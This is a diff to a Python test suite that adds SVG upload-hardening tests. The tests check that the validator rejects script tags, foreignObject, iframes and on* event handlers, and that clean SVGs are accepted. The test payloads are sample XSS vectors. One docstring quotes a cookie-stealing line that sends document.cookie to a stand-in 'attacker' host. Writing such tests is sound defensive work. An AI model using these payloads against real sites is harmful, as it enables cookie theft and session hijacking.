@@ -210,7 +210,6 @@ def test_magic_bytes_fake_png_rejected():
 
 def test_magic_bytes_unknown_extension_skipped():
     """Extensions without known magic bytes are skipped gracefully."""
-    _validate_magic_bytes(b'anything', 'svg')
     _validate_magic_bytes(b'anything', 'csv')
     _validate_magic_bytes(b'anything', 'txt')
 
@@ -406,3 +405,191 @@ def test_magic_bytes_webp_too_short():
     # Only 6 bytes, can't check offset 8-12, but starts with RIFF so passes magic
     # bytes. The WebP extra check requires len >= 12, so short files skip it.
     _validate_magic_bytes(short, 'webp')  # should not raise
+
+
+# ---------------------------------------------------------------------------
+# v1.34 — SVG XSS hardening
+# ---------------------------------------------------------------------------
+
+
+def test_default_allowed_types_excludes_svg():
+    """v1.34: SVG is no longer in the default allowed_types because it
+    can carry executable JavaScript that runs when the document is
+    rendered inline by a browser. Pre-1.34 a developer who forgot to
+    pass ``allowed_types`` silently inherited a stored-XSS surface;
+    the default now refuses SVG and projects must opt in explicitly.
+    """
+    from core.http.upload import _default_allowed_types
+
+    defaults = _default_allowed_types()
+    assert 'svg' not in defaults, (
+        f'svg leaked back into the default allowed_types ({defaults}) — every '
+        'project that calls save_upload(file) without args would re-acquire the '
+        'pre-1.34 stored-XSS surface'
+    )
+    # Sanity: the safe formats still come back through.
+    assert 'jpg' in defaults
+    assert 'png' in defaults
+    assert 'pdf' in defaults
+
+
+def test_svg_magic_bytes_accept_xml_prefix():
+    """A well-formed SVG starting with ``<?xml`` passes the magic-byte
+    prefix check. The prefix check is a sanity guard; the real
+    defence is :func:`_validate_svg_content`."""
+    _validate_magic_bytes(b'<?xml version="1.0" encoding="UTF-8"?>\n<svg>...', 'svg')
+
+
+def test_svg_magic_bytes_accept_svg_prefix():
+    """A bare ``<svg>`` prefix without the XML declaration also passes."""
+    _validate_magic_bytes(b'<svg xmlns="http://www.w3.org/2000/svg">', 'svg')
+
+
+def test_svg_magic_bytes_reject_non_svg():
+    """A file that doesn't look like SVG is rejected even if it claims
+    extension ``svg`` and MIME ``image/svg+xml``."""
+    with pytest.raises(UploadError, match='magic byte'):
+        _validate_magic_bytes(b'<html><body>not svg</body></html>', 'svg')
+
+
+def test_svg_content_rejects_script_tag():
+    """The most common SVG XSS vector: an inline ``<script>`` tag.
+
+    Real-world payload from public CVE write-ups:
+
+        <svg xmlns="http://www.w3.org/2000/svg">
+            <script>fetch('//attacker/?'+document.cookie)</script>
+        </svg>
+
+    Sanitisers that only strip ``<script>`` strings can be bypassed by
+    nesting (``<scr<script>ipt>``); we reject the upload entirely
+    instead of trying to clean it.
+    """
+    from core.http.upload import _validate_svg_content
+
+    payload = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
+    with pytest.raises(UploadError, match='forbidden tag'):
+        _validate_svg_content(payload)
+
+
+def test_svg_content_rejects_foreign_object():
+    """``<foreignObject>`` smuggles HTML — including ``<script>`` —
+    into the SVG namespace. Sanitisers that only strip ``<script>``
+    miss this; rejecting the tag itself is the safe primitive."""
+    from core.http.upload import _validate_svg_content
+
+    # Pure foreignObject (no inner <script>) so the test isolates the
+    # specific vector — the forbidden-tags loop short-circuits on the
+    # first match, and we want to assert that foreignObject ALONE is
+    # enough to reject the upload (because its embedded HTML tree can
+    # smuggle further XSS that the framework doesn't have to enumerate).
+    payload = (
+        b'<svg xmlns="http://www.w3.org/2000/svg">'
+        b'<foreignObject><iframe src="//attacker/"></iframe></foreignObject>'
+        b'</svg>'
+    )
+    with pytest.raises(UploadError, match='foreignobject|iframe'):
+        _validate_svg_content(payload)
+
+
+def test_svg_content_rejects_iframe():
+    """``<iframe>`` inside SVG (typically inside foreignObject) loads
+    arbitrary documents — same XSS surface as a top-level iframe."""
+    from core.http.upload import _validate_svg_content
+
+    payload = b'<svg><iframe src="//attacker/"></iframe></svg>'
+    with pytest.raises(UploadError, match='iframe'):
+        _validate_svg_content(payload)
+
+
+def test_svg_content_rejects_event_handler():
+    """An ``on*`` event handler attribute (``onload``, ``onclick``,
+    ``onerror``, …) executes JavaScript when the SVG is rendered. The
+    regex catches the entire class via ``\\son<lower>=`` rather than
+    enumerating every event name."""
+    from core.http.upload import _validate_svg_content
+
+    payload = b'<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>'
+    with pytest.raises(UploadError, match='on-\\* event handler'):
+        _validate_svg_content(payload)
+
+
+def test_svg_content_rejects_event_handler_mixed_case():
+    """The check is case-insensitive — ``OnLoad`` is the same vector
+    as ``onload``. HTML/SVG attribute names are case-insensitive at
+    parse time."""
+    from core.http.upload import _validate_svg_content
+
+    payload = b'<svg OnLoad="alert(1)"></svg>'
+    with pytest.raises(UploadError, match='on-\\* event handler'):
+        _validate_svg_content(payload)
+
+
+def test_svg_content_accepts_clean_svg():
+    """A well-formed SVG with no scripts, no embeds, and no event
+    handlers passes. Sanity check against over-zealous false positives
+    on legitimate icons / diagrams."""
+    from core.http.upload import _validate_svg_content
+
+    payload = (
+        b'<?xml version="1.0" encoding="UTF-8"?>'
+        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
+        b'<circle cx="50" cy="50" r="40" fill="red"/>'
+        b'<rect x="10" y="10" width="20" height="20"/>'
+        b'<path d="M10 10 L90 90"/>'
+        b'</svg>'
+    )
+    _validate_svg_content(payload)  # must not raise
+
+
+@pytest.mark.anyio
+async def test_save_upload_default_rejects_svg_extension():
+    """End-to-end: calling ``save_upload`` without ``allowed_types``
+    refuses SVG even if the magic bytes and MIME type are valid. This
+    is the load-bearing change for v1.34 — an old project that
+    silently relied on the SVG default now sees an explicit rejection
+    rather than an arbitrary-XSS upload."""
+    with tempfile.TemporaryDirectory() as tmpdir:
+        f = FakeUploadFile(
+            filename='icon.svg',
+            content_type='image/svg+xml',
+            content=b'<svg xmlns="http://www.w3.org/2000/svg"></svg>',
+        )
+        with pytest.raises(UploadError, match='not allowed'):
+            await save_upload(f, upload_dir=tmpdir)  # no allowed_types passed
+
+
+@pytest.mark.anyio
+async def test_save_upload_svg_xss_blocked_when_opted_in():
+    """End-to-end: even when SVG is explicitly opted into via
+    ``allowed_types=['svg']``, a payload with ``<script>`` is rejected
+    before it reaches disk. The opt-in path is for projects that need
+    SVG; the content scan keeps the obvious XSS vectors out."""
+    with tempfile.TemporaryDirectory() as tmpdir:
+        f = FakeUploadFile(
+            filename='icon.svg',
+            content_type='image/svg+xml',
+            content=b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
+        )
+        with pytest.raises(UploadError, match='forbidden tag'):
+            await save_upload(f, allowed_types=['svg'], upload_dir=tmpdir)
+
+
+@pytest.mark.anyio
+async def test_save_upload_clean_svg_accepted_when_opted_in():
+    """End-to-end: a clean SVG passes the v1.34 content scan when
+    explicitly opted in. Confirms the gate doesn't break the
+    legitimate use case."""
+    with tempfile.TemporaryDirectory() as tmpdir:
+        f = FakeUploadFile(
+            filename='icon.svg',
+            content_type='image/svg+xml',
+            content=(
+                b'<?xml version="1.0" encoding="UTF-8"?>'
+                b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">'
+                b'<circle cx="8" cy="8" r="6"/></svg>'
+            ),
+        )
+        result = await save_upload(f, allowed_types=['svg'], upload_dir=tmpdir)
+        assert result.filename.endswith('.svg')
+        assert os.path.exists(result.path)
